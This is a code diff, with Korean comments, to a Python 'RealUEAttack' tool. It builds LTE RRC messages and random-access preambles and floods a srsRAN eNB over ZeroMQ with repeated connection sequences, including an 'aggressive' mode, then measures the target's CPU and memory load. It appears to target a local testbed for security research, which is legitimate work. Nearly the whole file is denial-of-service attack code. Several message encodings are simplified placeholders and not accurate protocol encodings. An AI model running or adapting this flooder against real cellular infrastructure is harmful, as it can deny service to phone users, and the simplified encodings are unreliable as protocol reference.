@@ -31,17 +31,393 @@ class RealUEAttack:
         self.start_time = None
         self.end_time = None
         
-        # 실제 캡처된 UE 메시지들
+        # 실제 캡처된 UE 메시지들 (개선된 형식)
         self.real_messages = [
             # ZeroMQ 헤더
             bytes.fromhex("ff00000000000000017f"),
             # ZeroMQ 메시지 타입
             bytes.fromhex("03"),
-            # 실제 RRC Connection Request
+            # 실제 RRC Connection Request (올바른 형식)
             bytes.fromhex("01000001ff"),
             # ZeroMQ 소켓 설정
             bytes.fromhex("04260552454144590b536f636b65742d5479706500000003524551084964656e7469747900000000"),
         ]
+        
+        # LTE RRC 표준 메시지들
+        self.lte_rrc_messages = {
+            'rrc_connection_request': self.create_rrc_connection_request(),
+            'rrc_connection_setup_complete': self.create_rrc_connection_setup_complete(),
+            'rrc_connection_reconfiguration_complete': self.create_rrc_connection_reconfiguration_complete(),
+            'rrc_connection_reestablishment_request': self.create_rrc_connection_reestablishment_request(),
+            'measurement_report': self.create_measurement_report(),
+            'ue_capability_information': self.create_ue_capability_information()
+        }
+        
+        # 랜덤 액세스 프리앰블들
+        self.ra_preambles = self.create_ra_preambles()
+    
+    def create_rrc_connection_request(self):
+        """올바른 RRC Connection Request 메시지 생성"""
+        # RRC Connection Request 메시지 구조:
+        # - CriticalExtensions: c1
+        # - c1: rrcConnectionRequest-r8
+        # - rrcConnectionRequest-r8: ue-Identity, establishmentCause, spare
+        message = bytearray()
+        
+        # RRC 메시지 헤더 (ASN.1 PER 인코딩)
+        # CriticalExtensions: c1 (0)
+        message.extend([0x00])
+        
+        # c1: rrcConnectionRequest-r8 (0)
+        message.extend([0x00])
+        
+        # ue-Identity: s-TMSI (40 bits)
+        # s-TMSI: mmec (8 bits) + m-tmsi (32 bits)
+        mmec = random.randint(0, 255)
+        m_tmsi = random.randint(0, 0xFFFFFFFF)
+        message.extend([mmec])
+        message.extend(struct.pack('>I', m_tmsi))
+        
+        # establishmentCause: mo-Data (0)
+        message.extend([0x00])
+        
+        # spare: padding to byte boundary
+        message.extend([0x00])
+        
+        return bytes(message)
+    
+    def create_rrc_connection_setup_complete(self):
+        """RRC Connection Setup Complete 메시지 생성"""
+        message = bytearray()
+        
+        # RRC 메시지 헤더
+        message.extend([0x00])  # CriticalExtensions: c1
+        
+        # c1: rrcConnectionSetupComplete-r8 (0)
+        message.extend([0x00])
+        
+        # rrc-TransactionIdentifier: 0-3
+        message.extend([0x00])
+        
+        # selectedPLMN-Identity: 1
+        message.extend([0x01])
+        
+        # dedicatedInfoNAS: dummy NAS message
+        nas_message = bytes([0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00])
+        message.extend(nas_message)
+        
+        return bytes(message)
+    
+    def create_rrc_connection_reconfiguration_complete(self):
+        """RRC Connection Reconfiguration Complete 메시지 생성"""
+        message = bytearray()
+        
+        # RRC 메시지 헤더
+        message.extend([0x00])  # CriticalExtensions: c1
+        
+        # c1: rrcConnectionReconfigurationComplete-r8 (0)
+        message.extend([0x00])
+        
+        # rrc-TransactionIdentifier: 0-3
+        message.extend([0x00])
+        
+        return bytes(message)
+    
+    def create_rrc_connection_reestablishment_request(self):
+        """RRC Connection Reestablishment Request 메시지 생성"""
+        message = bytearray()
+        
+        # RRC 메시지 헤더
+        message.extend([0x00])  # CriticalExtensions: c1
+        
+        # c1: rrcConnectionReestablishmentRequest-r8 (0)
+        message.extend([0x00])
+        
+        # ue-Identity: c-RNTI (16 bits)
+        c_rnti = random.randint(1, 65535)
+        message.extend(struct.pack('>H', c_rnti))
+        
+        # reestablishmentCause: reconfigurationFailure (0)
+        message.extend([0x00])
+        
+        # shortMAC-I: 16 bits
+        short_mac_i = random.randint(0, 65535)
+        message.extend(struct.pack('>H', short_mac_i))
+        
+        return bytes(message)
+    
+    def create_measurement_report(self):
+        """Measurement Report 메시지 생성"""
+        message = bytearray()
+        
+        # RRC 메시지 헤더
+        message.extend([0x00])  # CriticalExtensions: c1
+        
+        # c1: measurementReport-r8 (0)
+        message.extend([0x00])
+        
+        # rrc-TransactionIdentifier: 0-3
+        message.extend([0x00])
+        
+        # measResults: dummy measurement results
+        message.extend([0x00, 0x00, 0x00, 0x00])
+        
+        return bytes(message)
+    
+    def create_ue_capability_information(self):
+        """UE Capability Information 메시지 생성"""
+        message = bytearray()
+        
+        # RRC 메시지 헤더
+        message.extend([0x00])  # CriticalExtensions: c1
+        
+        # c1: ueCapabilityInformation-r8 (0)
+        message.extend([0x00])
+        
+        # rrc-TransactionIdentifier: 0-3
+        message.extend([0x00])
+        
+        # ue-CapabilityRAT-List: dummy capability
+        message.extend([0x00, 0x00, 0x00, 0x00])
+        
+        return bytes(message)
+    
+    def create_ra_preambles(self):
+        """랜덤 액세스 프리앰블 생성"""
+        preambles = []
+        
+        # Zadoff-Chu 시퀀스 기반 프리앰블 생성
+        # 실제로는 더 복잡한 계산이 필요하지만, 여기서는 간단한 패턴 사용
+        for i in range(64):  # 64개 프리앰블
+            preamble = bytearray()
+            
+            # 프리앰블 ID (6 bits)
+            preamble.extend([i & 0x3F])
+            
+            # ZC 시퀀스 (839 samples, 여기서는 축약)
+            # 실제로는 복잡한 수학적 계산이 필요
+            for j in range(104):  # 축약된 길이
+                sample = random.randint(0, 255)
+                preamble.extend([sample])
+            
+            preambles.append(bytes(preamble))
+        
+        return preambles
+    
+    def send_ra_preamble(self, preamble_id=None):
+        """랜덤 액세스 프리앰블 전송"""
+        if preamble_id is None:
+            preamble_id = random.randint(0, len(self.ra_preambles) - 1)
+        
+        preamble = self.ra_preambles[preamble_id]
+        
+        try:
+            socket = self.context.socket(zmq.PUSH)
+            socket.connect(f"tcp://localhost:{self.target_port}")
+            
+            # 프리앰블 전송 (물리 계층 시뮬레이션)
+            socket.send(preamble, zmq.NOBLOCK)
+            socket.close()
+            
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] RA 프리앰블 #{preamble_id} 전송")
+            print(f"  프리앰블 크기: {len(preamble)} bytes")
+            return True
+            
+        except Exception as e:
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] RA 프리앰블 전송 실패: {e}")
+            return False
+    
+    def send_lte_rrc_message(self, message_type, message_data=None):
+        """LTE RRC 메시지 전송"""
+        if message_type not in self.lte_rrc_messages:
+            print(f"알 수 없는 메시지 타입: {message_type}")
+            return False
+        
+        message = self.lte_rrc_messages[message_type]
+        
+        try:
+            socket = self.context.socket(zmq.PUSH)
+            socket.connect(f"tcp://localhost:{self.target_port}")
+            
+            # ZeroMQ 헤더 + RRC 메시지
+            full_message = bytearray()
+            full_message.extend(self.real_messages[0])  # ZeroMQ 헤더
+            full_message.extend(self.real_messages[1])  # 메시지 타입
+            full_message.extend(message)  # RRC 메시지
+            
+            socket.send(bytes(full_message), zmq.NOBLOCK)
+            socket.close()
+            
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송")
+            print(f"  메시지 크기: {len(full_message)} bytes")
+            print(f"  RRC 데이터: {message.hex()}")
+            return True
+            
+        except Exception as e:
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송 실패: {e}")
+            return False
+    
+    def perform_ra_procedure(self):
+        """완전한 랜덤 액세스 절차 수행"""
+        print(f"=== 랜덤 액세스 절차 시작 ===")
+        
+        # 1. 프리앰블 전송
+        preamble_id = random.randint(0, len(self.ra_preambles) - 1)
+        if not self.send_ra_preamble(preamble_id):
+            return False
+        
+        # 2. RAR 대기 시뮬레이션 (실제로는 eNB 응답 대기)
+        time.sleep(0.01)  # 10ms 대기
+        
+        # 3. RRC Connection Request 전송
+        if not self.send_lte_rrc_message('rrc_connection_request'):
+            return False
+        
+        # 4. RRC Connection Setup 대기 시뮬레이션
+        time.sleep(0.01)  # 10ms 대기
+        
+        # 5. RRC Connection Setup Complete 전송
+        if not self.send_lte_rrc_message('rrc_connection_setup_complete'):
+            return False
+        
+        print(f"=== 랜덤 액세스 절차 완료 ===")
+        return True
+    
+    def perform_complete_connection_sequence(self):
+        """완전한 LTE 연결 시퀀스 수행"""
+        print(f"=== 완전한 LTE 연결 시퀀스 시작 ===")
+        
+        # 1. 랜덤 액세스 절차
+        if not self.perform_ra_procedure():
+            print("랜덤 액세스 절차 실패")
+            return False
+        
+        # 2. RRC 연결 설정 완료 후 추가 메시지들
+        time.sleep(0.01)
+        
+        # 3. UE Capability Information 전송
+        if not self.send_lte_rrc_message('ue_capability_information'):
+            print("UE Capability Information 전송 실패")
+            return False
+        
+        time.sleep(0.01)
+        
+        # 4. Measurement Report 전송
+        if not self.send_lte_rrc_message('measurement_report'):
+            print("Measurement Report 전송 실패")
+            return False
+        
+        time.sleep(0.01)
+        
+        # 5. RRC Connection Reconfiguration Complete 전송
+        if not self.send_lte_rrc_message('rrc_connection_reconfiguration_complete'):
+            print("RRC Connection Reconfiguration Complete 전송 실패")
+            return False
+        
+        print(f"=== 완전한 LTE 연결 시퀀스 완료 ===")
+        return True
+    
+    def perform_aggressive_connection_flooding(self):
+        """공격적인 연결 플러딩 수행"""
+        print(f"=== 공격적인 연결 플러딩 시작 ===")
+        
+        # 동시에 여러 연결 시도
+        success_count = 0
+        
+        for i in range(10):  # 10개 동시 연결 시도
+            if self.perform_complete_connection_sequence():
+                success_count += 1
+            time.sleep(0.001)  # 1ms 간격
+        
+        print(f"=== 공격적인 연결 플러딩 완료: {success_count}/10 성공 ===")
+        return success_count
+    
+    def monitor_enb_responses(self, duration=5):
+        """eNB 응답 모니터링"""
+        print(f"=== eNB 응답 모니터링 시작 ({duration}초) ===")
+        
+        # 응답 수신을 위한 SUB 소켓 생성
+        response_socket = self.context.socket(zmq.SUB)
+        response_socket.connect(f"tcp://localhost:{self.target_port + 1}")  # 응답 포트
+        response_socket.setsockopt(zmq.SUBSCRIBE, b"")  # 모든 메시지 구독
+        
+        responses = []
+        start_time = time.time()
+        
+        while (time.time() - start_time) < duration:
+            try:
+                # 응답 대기 (타임아웃 설정)
+                response_socket.setsockopt(zmq.RCVTIMEO, 100)  # 100ms 타임아웃
+                response = response_socket.recv(zmq.NOBLOCK)
+                
+                timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
+                response_data = {
+                    'timestamp': timestamp,
+                    'data': response.hex(),
+                    'size': len(response)
+                }
+                responses.append(response_data)
+                
+                print(f"[{timestamp}] eNB 응답 수신: {len(response)} bytes")
+                print(f"  데이터: {response.hex()}")
+                
+            except zmq.Again:
+                # 타임아웃 - 계속 대기
+                continue
+            except Exception as e:
+                print(f"응답 수신 오류: {e}")
+                break
+        
+        response_socket.close()
+        
+        print(f"=== eNB 응답 모니터링 완료: {len(responses)}개 응답 수신 ===")
+        return responses
+    
+    def monitor_srsran_logs(self, duration=5):
+        """srsRAN 로그 모니터링"""
+        print(f"=== srsRAN 로그 모니터링 시작 ({duration}초) ===")
+        
+        # srsRAN 로그 파일 모니터링
+        log_files = [
+            "/tmp/srsenb.log",
+            "/tmp/srsue.log", 
+            "/var/log/srsran/enb.log",
+            "/var/log/srsran/ue.log"
+        ]
+        
+        log_entries = []
+        start_time = time.time()
+        
+        for log_file in log_files:
+            if os.path.exists(log_file):
+                try:
+                    # tail -f로 실시간 로그 모니터링
+                    cmd = ["tail", "-f", "-n", "0", log_file]
+                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
+                                            stderr=subprocess.PIPE, text=True)
+                    
+                    while (time.time() - start_time) < duration:
+                        line = process.stdout.readline()
+                        if line:
+                            timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
+                            log_entry = {
+                                'timestamp': timestamp,
+                                'file': log_file,
+                                'content': line.strip()
+                            }
+                            log_entries.append(log_entry)
+                            
+                            print(f"[{timestamp}] {log_file}: {line.strip()}")
+                    
+                    process.terminate()
+                    break  # 첫 번째 유효한 로그 파일만 모니터링
+                    
+                except Exception as e:
+                    print(f"로그 모니터링 오류 ({log_file}): {e}")
+                    continue
+        
+        print(f"=== srsRAN 로그 모니터링 완료: {len(log_entries)}개 엔트리 ===")
+        return log_entries
     
     def get_system_stats(self):
         """시스템 리소스 통계 수집"""
@@ -208,8 +584,8 @@ class RealUEAttack:
         time.sleep(0.01)
     
     def rrc_connection_flood(self, duration=60):
-        """RRC Connection Request 플러딩 (실제 UE 메시지 사용)"""
-        self.setup_logging("rrc_connection", duration)
+        """개선된 RRC Connection Request 플러딩 (완전한 LTE 절차 사용)"""
+        self.setup_logging("rrc_connection_improved", duration)
         
         # 공격 시작 전 리소스 상태 캡처
         self.log_message("공격 시작 전 리소스 상태 캡처 중...")
@@ -225,7 +601,7 @@ class RealUEAttack:
             self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
         
         self.log_message("=" * 50)
-        self.log_message(f"=== 실제 UE RRC Connection Request 플러딩 시작 ===")
+        self.log_message(f"=== 개선된 RRC Connection Request 플러딩 시작 ===")
         self.log_message(f"대상 포트: {self.target_port}")
         self.log_message(f"지속 시간: {duration}초")
         self.log_message("=" * 50)
@@ -233,13 +609,161 @@ class RealUEAttack:
         self.running = True
         start_time = time.time()
         count = 0
+        success_count = 0
+        
+        # 응답 모니터링 스레드 시작
+        response_thread = threading.Thread(target=self.monitor_enb_responses, args=(duration,))
+        response_thread.daemon = True
+        response_thread.start()
         
         while self.running and (time.time() - start_time) < duration:
-            # 실제 RRC Connection Request 메시지 사용
-            message = self.real_messages[2]  # 01000001ff
+            # 완전한 연결 시퀀스 수행
+            if self.perform_complete_connection_sequence():
+                success_count += 1
             
-            if self.send_real_message(message, f"RRC Connection Request #{count+1}"):
-                count += 1
+            count += 1
+            time.sleep(0.05)  # 50ms 간격 (더 빠른 공격)
+        
+        # 공격 종료 후 리소스 상태 캡처
+        self.log_message("=" * 50)
+        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
+        self.end_stats = self.get_system_stats()
+        self.end_time = datetime.now()
+        
+        if self.end_stats:
+            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
+            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
+            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
+            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
+        
+        # 리소스 변화량 계산 및 출력
+        if self.start_stats and self.end_stats:
+            self.log_message("=" * 50)
+            self.log_message("=== 리소스 변화량 분석 ===")
+            
+            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
+            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
+            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
+            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
+            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
+            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
+            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
+            
+            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
+            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
+            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
+            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
+            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
+            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
+            
+            # 공격 효과 분석
+            self.log_message("=" * 50)
+            self.log_message("=== 공격 효과 분석 ===")
+            if abs(cpu_change) > 5:
+                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
+            
+            if abs(memory_change) > 2:
+                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
+            
+            if abs(srsran_cpu_change) > 5:
+                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
+            
+            if abs(srsran_memory_change) > 2:
+                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
+        
+        # 결과를 JSON 파일로 저장
+        self.save_attack_results(count, duration, success_count)
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 개선된 플러딩 완료 ===")
+        self.log_message(f"총 {count}개 연결 시도")
+        self.log_message(f"성공한 연결: {success_count}개")
+        self.log_message(f"성공률: {(success_count/count*100):.1f}%" if count > 0 else "성공률: 0%")
+        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
+        self.log_message("=" * 50)
+    
+    def save_attack_results(self, message_count, duration, success_count=0):
+        """공격 결과를 JSON 파일로 저장"""
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        results_file = f"{self.log_dir}/improved_attack_results_{timestamp}.json"
+        
+        results = {
+            'attack_info': {
+                'type': 'rrc_connection_improved',
+                'duration': duration,
+                'message_count': message_count,
+                'success_count': success_count,
+                'success_rate': (success_count/message_count*100) if message_count > 0 else 0,
+                'target_port': self.target_port,
+                'start_time': self.start_time.isoformat() if self.start_time else None,
+                'end_time': self.end_time.isoformat() if self.end_time else None
+            },
+            'start_stats': self.start_stats,
+            'end_stats': self.end_stats,
+            'lte_rrc_messages_used': {
+                msg_type: msg.hex() for msg_type, msg in self.lte_rrc_messages.items()
+            },
+            'ra_preambles_count': len(self.ra_preambles)
+        }
+        
+        with open(results_file, 'w', encoding='utf-8') as f:
+            json.dump(results, f, indent=2, ensure_ascii=False)
+        
+        self.log_message(f"공격 결과 저장: {results_file}")
+    
+    def aggressive_rrc_flood(self, duration=60):
+        """공격적인 RRC 플러딩 (동시 다중 연결)"""
+        self.setup_logging("aggressive_rrc", duration)
+        
+        # 공격 시작 전 리소스 상태 캡처
+        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
+        self.start_stats = self.get_system_stats()
+        self.start_time = datetime.now()
+        
+        if self.start_stats:
+            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
+            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
+            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
+            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 공격적인 RRC 플러딩 시작 ===")
+        self.log_message(f"대상 포트: {self.target_port}")
+        self.log_message(f"지속 시간: {duration}초")
+        self.log_message("=" * 50)
+        
+        self.running = True
+        start_time = time.time()
+        total_attempts = 0
+        total_success = 0
+        
+        # 응답 모니터링 스레드 시작
+        response_thread = threading.Thread(target=self.monitor_enb_responses, args=(duration,))
+        response_thread.daemon = True
+        response_thread.start()
+        
+        # srsRAN 로그 모니터링 스레드 시작
+        log_thread = threading.Thread(target=self.monitor_srsran_logs, args=(duration,))
+        log_thread.daemon = True
+        log_thread.start()
+        
+        while self.running and (time.time() - start_time) < duration:
+            # 동시에 여러 연결 시도
+            success_count = self.perform_aggressive_connection_flooding()
+            total_attempts += 10  # 10개씩 시도
+            total_success += success_count
             
             time.sleep(0.1)  # 100ms 간격
         
@@ -301,39 +825,15 @@ class RealUEAttack:
                 self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
         
         # 결과를 JSON 파일로 저장
-        self.save_attack_results(count, duration)
+        self.save_attack_results(total_attempts, duration, total_success)
         
         self.log_message("=" * 50)
-        self.log_message(f"=== 플러딩 완료 ===")
-        self.log_message(f"총 {count}개 메시지 전송")
+        self.log_message(f"=== 공격적인 플러딩 완료 ===")
+        self.log_message(f"총 {total_attempts}개 연결 시도")
+        self.log_message(f"성공한 연결: {total_success}개")
+        self.log_message(f"성공률: {(total_success/total_attempts*100):.1f}%" if total_attempts > 0 else "성공률: 0%")
         self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
         self.log_message("=" * 50)
-    
-    def save_attack_results(self, message_count, duration):
-        """공격 결과를 JSON 파일로 저장"""
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        results_file = f"{self.log_dir}/real_ue_attack_results_{timestamp}.json"
-        
-        results = {
-            'attack_info': {
-                'type': 'rrc_connection',
-                'duration': duration,
-                'message_count': message_count,
-                'target_port': self.target_port,
-                'start_time': self.start_time.isoformat() if self.start_time else None,
-                'end_time': self.end_time.isoformat() if self.end_time else None
-            },
-            'start_stats': self.start_stats,
-            'end_stats': self.end_stats,
-            'real_messages_used': [
-                msg.hex() for msg in self.real_messages
-            ]
-        }
-        
-        with open(results_file, 'w', encoding='utf-8') as f:
-            json.dump(results, f, indent=2, ensure_ascii=False)
-        
-        self.log_message(f"공격 결과 저장: {results_file}")
     
     def run_all_attacks(self, duration=60):
         """모든 공격 유형을 순차적으로 실행하고 결과 비교"""
@@ -803,7 +1303,7 @@ def main():
     parser = argparse.ArgumentParser(description='실제 UE 메시지를 사용한 공격')
     parser.add_argument('--target-port', type=int, default=2001, help='eNB 포트 (기본값: 2001)')
     parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
-    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'all'], 
+    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'aggressive', 'all'], 
                        default='mixed', help='공격 유형')
     
     args = parser.parse_args()
@@ -815,6 +1315,8 @@ def main():
             attacker.rrc_connection_flood(args.duration)
         elif args.attack_type == 'zeromq':
             attacker.zeromq_sequence_flood(args.duration)
+        elif args.attack_type == 'aggressive':
+            attacker.aggressive_rrc_flood(args.duration)
         elif args.attack_type == 'all':
             attacker.run_all_attacks(args.duration)
         else:
